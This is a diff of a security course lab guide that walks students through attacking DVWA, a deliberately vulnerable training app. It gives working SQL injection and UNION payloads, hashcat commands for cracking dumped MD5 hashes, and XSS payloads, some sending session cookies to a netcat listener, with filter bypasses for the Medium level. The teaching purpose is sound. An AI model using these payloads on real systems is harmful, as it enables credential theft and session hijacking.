@@ -80,33 +80,122 @@ You play both sides: in Part 1 you break out of a query and out of a page, then 
 ## Part 1 — Offensive: injection & XSS · ~45 min
 
 ### 1.1 SQL injection — dump the database
-In the *SQL Injection* module (`User ID` field), inject a payload that returns every row (an always-true condition, then a `UNION SELECT` for usernames and password hashes).
+**SQL injection** makes part of your input become SQL syntax. Open **SQL Injection** in the left menu and work through the attack in small steps:
 
-The `User ID` box doesn't ask the database a question — it *builds* one by pasting your text into a `SELECT ... WHERE id = '<input>'` string. Close that string with a `'` and the rest of the line is read as SQL, not as an ID: an always-true condition opens the gate, and `UNION SELECT` welds a second query of your own onto the first so you choose which columns come back.
+1. Enter `1` in **User ID** and click **Submit**. This is the normal baseline: the app returns one user whose ID is 1.
+2. Replace it with this payload and click **Submit**:
 
-> [!NOTE]
-> **Expected.** Instead of one user, the app prints all of them — including usernames and password hashes from the `users` table.
-
-**In the report:** the payload, the extracted users and hashes. **Crack one hash** (hashcat, as in Lab 01) and attach the result.
-
-### 1.2 XSS — steal a session
-In *XSS (Reflected)* inject a script that prints `document.cookie`. Then in *XSS (Stored)* save a payload that sends the cookie to your listener; include your student ID in the payload:
-
-```bash
-nc -lvnp 8000     # on Kali, listener for the stolen cookie
+```text
+1' OR '1'='1' #
 ```
 
-The server never runs your script — it only stores or echoes it, and then *another user's browser* runs it while logged in as them. That is the whole danger of XSS: it borrows the victim's session, so `document.cookie` is their cookie and a stored payload fires for everyone who opens the page. **Reflected** XSS lives in a URL you must get the victim to click; **stored** XSS is saved on the server and waits.
+The first `'` closes the value in `WHERE user_id = '<input>'`. `OR '1'='1'` is true for every row, while `#` starts a comment so the database ignores the closing quote added by the application.
+
+> [!NOTE]
+> **Expected.** Five user records appear instead of one. You have changed the meaning of the application's query.
+
+3. Now replace the payload with this one and submit it:
+
+```text
+1' UNION SELECT user,password FROM users #
+```
+
+`UNION SELECT` appends results from a second query. The original page prints two columns, so the injected query also returns two: the username and password hash from every row of `users`.
+
+> [!NOTE]
+> **Expected.** The page includes usernames such as `admin` and 32-character hexadecimal password hashes.
+
+4. Copy one hash without spaces into a file, then repeat the MD5 dictionary attack from [Lab 01](../lab-01-hashing/README.md). Replace `<HASH>` with the value you copied:
+
+```bash
+printf '%s\n' '<HASH>' > hash.txt
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 0 hash.txt --show
+```
+
+`-m 0` tells hashcat that the value is an MD5 hash, and `-a 0` tests each password from `rockyou.txt`. The `--show` line prints the result as `hash:password` after the attack finishes.
+
+**In the report:** both SQL payloads, the extracted usernames and hashes, and the `hashcat --show` result for one cracked hash.
+
+### 1.2 XSS — steal a session
+**Cross-site scripting (XSS)** makes the browser treat input as JavaScript. First prove **reflected XSS**, where the application immediately returns your payload in the same response:
+
+1. Open **XSS (Reflected)**, paste this payload into **What's your name?**, and click **Submit**:
+
+```html
+<script>alert(document.cookie)</script>
+```
+
+`document.cookie` is the JavaScript view of cookies available to this page. DVWA prints the input without encoding it, so the browser creates a real `<script>` element and runs it.
+
+> [!NOTE]
+> **Expected.** A Firefox alert shows `security=low` and a `PHPSESSID` value. Close the alert to continue.
+
+Now prove **stored XSS**, where DVWA saves the payload in its guestbook and runs it whenever someone opens that page.
+
+2. Open a second terminal and start **netcat** (`nc`) as a listener on TCP port 8000. Leave it running:
+
+```bash
+nc -lvnp 8000
+```
+
+The listener is a small server that waits for the browser's request and prints it. It does not need to return a web page.
+
+3. Open **XSS (Stored)**. The HTML form limits **Name** to 10 characters and **Message** to 50, but that is only a browser-side `maxlength` rule. Right-click the **Message** field → **Inspect**, double-click `maxlength="50"` in the highlighted `<textarea>` and change it to `200`.
+4. Enter `<ID>` in **Name**, paste this payload into **Message**, replace `<ID>` with your student ID, and click **Sign Guestbook**:
+
+```html
+<script>fetch('http://127.0.0.1:8000/?id=<ID>&c='+encodeURIComponent(document.cookie))</script>
+```
+
+When the guestbook reloads, the stored script runs in Firefox and sends the cookie to `nc`. `encodeURIComponent` makes the cookie safe to place in a URL. Here `127.0.0.1` is correct: Firefox and the listener both run on the same Kali machine; the DVWA container does not make this request.
+
+> [!NOTE]
+> **Expected.** The `nc` terminal shows an HTTP `GET /?id=<ID>&c=...` request containing your ID and URL-encoded cookie fields such as `security%3Dlow` and `PHPSESSID%3D...`.
+
+> [!TIP]
+> **Common pitfall.** No request at `nc`? Check that the listener was already running, the security level is still **Low**, and the guestbook page reloaded after **Sign Guestbook**. Press `Ctrl-C` to stop an old listener before starting it again.
+
+5. After taking the screenshot, press `Ctrl-C` in the `nc` terminal. Netcat prints the request but does not send an HTTP response, so that first connection may otherwise stay open.
 
 **In the report:** a reflected XSS printing the cookie (screenshot) and a stored XSS sending it to your `nc` (screenshot with your ID visible).
 
 ### 1.3 Raise the bar
-Switch **DVWA Security → Medium** and repeat. Explain what the filter blocked and how you bypassed it.
+Medium adds filters, but each one protects only the exact pattern its developer expected. Test all three cases:
 
-Medium doesn't fix the bug — it filters the input, stripping a keyword here and escaping a character there, which is why *sanitising bad input* is a losing game. There is always another encoding, case or structure the filter forgot; only separating code from data (2.2) closes the hole for good.
+1. Open **DVWA Security**, choose **Medium**, click **Submit**, then return to **SQL Injection**. The text field is now a dropdown and the form sends its value with HTTP POST.
+2. Right-click the dropdown → **Inspect**. In the highlighted `<select>`, find an option such as `<option value="1">1</option>`, double-click its `value`, and change it to `1 OR 1=1`. Return to the page, select the edited option and click **Submit**.
+
+Medium escapes quote characters, but this query places the ID into SQL without quotes. The numeric payload needs no quote, and changing the HTML proves that a server cannot trust a dropdown: a client can send any POST value.
+
+> [!NOTE]
+> **Expected.** All five users appear again even though the page offered only IDs 1–5.
+
+3. Open **XSS (Reflected)** and submit this mixed-case payload:
+
+```html
+<ScRiPt>alert(document.cookie)</ScRiPt>
+```
+
+The Medium filter removes only the exact lowercase text `<script>`. HTML tag names are case-insensitive, so Firefox still recognises `<ScRiPt>` as a script element.
+
+4. Make sure the earlier `nc` listener is stopped. Open **XSS (Stored)**, click **Clear Guestbook** and confirm the prompt; this removes the Low payload so it cannot be mistaken for a Medium bypass. Start a fresh listener with `nc -lvnp 8000`. Then right-click **Name** → **Inspect** and change `maxlength="10"` to `200`. Put `Medium <ID>` in **Message** and this mixed-case payload in **Name**, again replacing `<ID>`:
+
+```html
+<ScRiPt>fetch('//127.0.0.1:8000/?id=M<ID>&c='+encodeURIComponent(document.cookie))</ScRiPt>
+```
+
+The leading `//` reuses the page's HTTP protocol and keeps the payload short. The `M` before your ID marks this as the Medium test. The Medium Stored filter removes all tags from **Message**, but checks **Name** only for the exact lowercase `<script>` string. The mixed-case tag survives that blacklist and the browser executes it.
+
+> [!NOTE]
+> **Expected.** The reflected payload opens an alert with `security=medium`; the stored payload produces a new request at `nc` containing `id=M<ID>`, `security%3Dmedium` and `PHPSESSID%3D...`.
 
 > [!TIP]
-> **Common pitfall.** Medium strips some characters/keywords — change case, encoding or structure. No cookie at `nc`? The XSS runs in **your browser**, so it (not the DVWA container) must reach your listener — put your Kali IP, not `localhost`, in the payload.
+> **Common pitfall.** Editing `maxlength` changes only the current page. If you reload before submitting, repeat the edit. For SQL injection, select the option whose `value` you changed before clicking **Submit**.
+
+Medium has not removed the vulnerability; it has only blacklisted a few strings. Case changes and a different input field bypass those assumptions. Part 2 fixes the boundary itself so the same input remains data.
+
+**In the report:** screenshots of the Medium SQLi result and both Medium XSS results, plus 3–5 sentences explaining what each filter tried to block and why the bypass worked.
 
 ## Part 2 — Defensive: fix the code · ~30 min
 
